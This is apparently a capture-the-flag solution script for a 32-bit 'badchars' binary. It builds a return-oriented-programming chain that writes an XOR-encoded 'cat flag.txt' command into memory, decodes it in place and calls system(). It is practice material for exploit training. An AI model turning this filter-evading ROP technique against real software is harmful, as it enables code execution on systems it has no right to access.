#!/usr/bin/python3

from pwn import *

#context.log_level = 'DEBUG'

xor_cl_into_ebx_addr = 0x08048890
pop_ebx_ecx_addr = 0x08048896

mov_esi_into_edi_addr = 0x08048893
pop_esi_edi_addr = 0x08048899

def rop_mov_dword_into(dst, dword):
    rop = ''
    rop += p32(pop_esi_edi_addr)
    rop += dword
    rop += p32(dst)
    rop += p32(mov_esi_into_edi_addr)
    return rop

def rop_xor_byte_into(dst, xor_byte):
    rop = ''
    rop += p32(pop_ebx_ecx_addr)
    rop += p32(dst)
    rop += p32(ord(xor_byte))
    rop += p32(xor_cl_into_ebx_addr)
    return rop

command = "cat flag.txt\x00\x00\x00\x00"

xor_byte = '0'

xored_command = ''.join(map(lambda x: chr(ord(xor_byte) ^ ord(x)), command))
#print xored_command

filename = './badchars32'

elf = ELF(filename)

system_addr = elf.symbols.system
exit_addr = elf.symbols.exit
bss_addr = elf.bss(0)

padding = 'A' * 44

payload = padding

# mov xored_command into bss
for index in xrange(0, len(xored_command), 4):
    payload += rop_mov_dword_into(bss_addr+index, xored_command[index:index+4])

# mov xor xored_command in bss with xor_byte
for index in xrange(len(xored_command)):
    payload += rop_xor_byte_into(bss_addr+index, xor_byte)

# call system(command) and exit(0)
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(bss_addr)
payload += p32(0)

p = process(filename)

p.recvuntil('\n> ')

p.sendline(payload)

log.info("Flag: {p.recv(1024).decode()}")
